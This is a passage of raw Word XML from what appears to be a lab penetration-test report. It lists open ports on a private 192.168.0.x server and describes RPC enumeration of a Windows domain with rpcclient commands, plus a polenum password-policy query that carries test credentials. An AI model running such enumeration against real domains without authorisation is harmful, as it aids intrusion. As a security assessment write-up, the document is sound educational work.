        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BB1A47" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Computer number: 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FEBD5DA" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Name: SERVER2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15781804" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>IP address: 192.168.0.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3E02D5" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">Ports </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>( 67</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> scanned, 7 opened, 60 closed )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FF73C1" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="67088CCD" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Port 23 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0E7E92" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 53 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1A88AC" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 80 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF9FBF6" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 88 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A43DF2A" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 135 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D51D15" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 139 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C98BC3" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="00190C8A" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 445 – open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6903AF93" w14:textId="77777777" w:rsidR="00190C8A" w:rsidRDefault="00743EC1" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="_Toc27518404"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Vulnerability scan</w:t>
      </w:r>
      <w:r w:rsidR="00190C8A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> results</w:t>
      </w:r>
      <w:bookmarkEnd w:id="15"/>
    </w:p>
    <w:p w14:paraId="4D737E48" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="00743EC1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>To see the</w:t>
      </w:r>
      <w:r w:rsidR="004B786F">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> vanilla</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> nmap tcp </w:t>
      </w:r>
      <w:r w:rsidR="004B786F">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>ort scan results see appendi</w:t>
      </w:r>
      <w:r w:rsidR="004B7E63">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="004B786F">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00622CF7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C06EDD" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>To see the nmap vulnerability scan results for 192.168.0.1 and 192.168.0.2 see appendi</w:t>
      </w:r>
      <w:r w:rsidR="004B7E63">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">:  </w:t>
      </w:r>
      <w:r w:rsidR="00622CF7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">    and appendi</w:t>
      </w:r>
      <w:r w:rsidR="004B7E63">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00622CF7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B6A04E8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00743EC1" w:rsidRDefault="007077E7" w:rsidP="00743EC1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">To see the Nessus scan </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>readout</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> see appendi</w:t>
      </w:r>
      <w:r w:rsidR="004B7E63">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="00622CF7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> Nessus Scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D4AEBFA" w14:textId="77777777" w:rsidR="00261D49" w:rsidRDefault="00261D49" w:rsidP="00261D49">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc27518405"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Enumeration results</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
    </w:p>
    <w:p w14:paraId="3E4BE2C3" w14:textId="77777777" w:rsidR="004B7E63" w:rsidRPr="004B7E63" w:rsidRDefault="00743EC1" w:rsidP="004B7E63">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">RPC Enumeration was conducted using rpcclient on Kali Linux. This was done by entering </w:t>
      </w:r>
      <w:r w:rsidR="008F7950">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">the test users details </w:t>
      </w:r>
      <w:r w:rsidR="008F7950">
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>rpcclient -U “test” 192.168.0.1</w:t>
      </w:r>
      <w:r w:rsidR="008F7950">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">. Once this was completed server information was enumerated through rpcclients </w:t>
      </w:r>
      <w:r w:rsidR="008F7950">
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">srvinfo </w:t>
      </w:r>
      <w:r w:rsidR="008F7950">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>utility</w:t>
      </w:r>
      <w:r w:rsidR="004B7E63">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>. See fig 17.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00471FF2" w14:textId="77777777" w:rsidR="008F7950" w:rsidRDefault="004B7E63" w:rsidP="008F7950">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B7E63">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251706368" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2A8AB01A" wp14:editId="25929835">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>790042</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>3568091</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3971925" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="9525" b="4445"/>
                <wp:wrapTopAndBottom/>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1925" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="433F12A1" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>17 rpcclient used to enumerate 192.168.0.1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8AB01A" id="_x0000_s1042" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:62.2pt;margin-top:280.95pt;width:312.75pt;height:20.65pt;z-index:251706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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="433F12A1" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>17 rpcclient used to enumerate 192.168.0.1</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="008F7950">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="03E5FD07" wp14:editId="2928ABDE">
            <wp:extent cx="3990109" cy="348741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0719" t="17681" r="52964" b="41427"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4016025" cy="3510067"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A136DE" w14:textId="77777777" w:rsidR="004B7E63" w:rsidRDefault="004B7E63" w:rsidP="008F7950">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AC2C615" w14:textId="77777777" w:rsidR="004B7E63" w:rsidRDefault="004B7E63" w:rsidP="008F7950">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D35D6EA" w14:textId="77777777" w:rsidR="004B7E63" w:rsidRDefault="004B7E63" w:rsidP="008F7950">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5582AD31" w14:textId="77777777" w:rsidR="008F7950" w:rsidRDefault="008F7950" w:rsidP="00743EC1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Once this was completed the dom users were quired by using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>enumdomusers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="113B1702" w14:textId="77777777" w:rsidR="008F7950" w:rsidRPr="008F7950" w:rsidRDefault="008F7950" w:rsidP="00743EC1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Groups within the domain were enumerated by using </w:t>
      </w:r>
      <w:r w:rsidRPr="008F7950">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>enumalsgroups builtin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22EE51EA" w14:textId="77777777" w:rsidR="008F7950" w:rsidRPr="00622CF7" w:rsidRDefault="008F7950" w:rsidP="00743EC1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="17" w:name="_Hlk27446578"/>
      <w:r>
        <w:t xml:space="preserve">The domain was </w:t>
      </w:r>
      <w:r w:rsidR="00DC441B">
        <w:t xml:space="preserve">queried through </w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>
      <w:r w:rsidR="00DC441B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>enumalsgroups domain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC93B9A" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00DC441B" w:rsidRDefault="00622CF7" w:rsidP="00743EC1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Results can be seen in the appendix G</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62004242" w14:textId="77777777" w:rsidR="00DC441B" w:rsidRPr="00DC441B" w:rsidRDefault="00DC441B" w:rsidP="00743EC1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">An attempt to attain information regarding the admins </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC441B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SID</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was queried through </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>lookupnames administrator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EFACA79" w14:textId="77777777" w:rsidR="00DC441B" w:rsidRPr="00A661DD" w:rsidRDefault="00DC441B" w:rsidP="00DC441B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC441B">
        <w:t>And further by attempting to get the Admins information through</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> queryuser 500</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36365E65" w14:textId="77777777" w:rsidR="00A661DD" w:rsidRDefault="00A661DD" w:rsidP="00DC441B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5ED02BBF" w14:textId="77777777" w:rsidR="00DC441B" w:rsidRDefault="00DC441B" w:rsidP="00DC441B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Polenum was used to get information about the password policy through </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">polenum </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>test:test123@192.168.0.1</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="004B7E63">
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="004B7E63" w:rsidRPr="004B7E63">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>see fig 18</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732B1D2B" w14:textId="77777777" w:rsidR="00DC441B" w:rsidRPr="00DC441B" w:rsidRDefault="00DC441B" w:rsidP="00DC441B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="580AF235" w14:textId="77777777" w:rsidR="00DC441B" w:rsidRDefault="004B7E63" w:rsidP="00DC441B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1089"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B97061">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251709440" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="18563194" wp14:editId="3DB8AAA5">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2277745</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3971925" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="9525" b="4445"/>
                <wp:wrapTopAndBottom/>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1925" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="3DDB2E8D" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
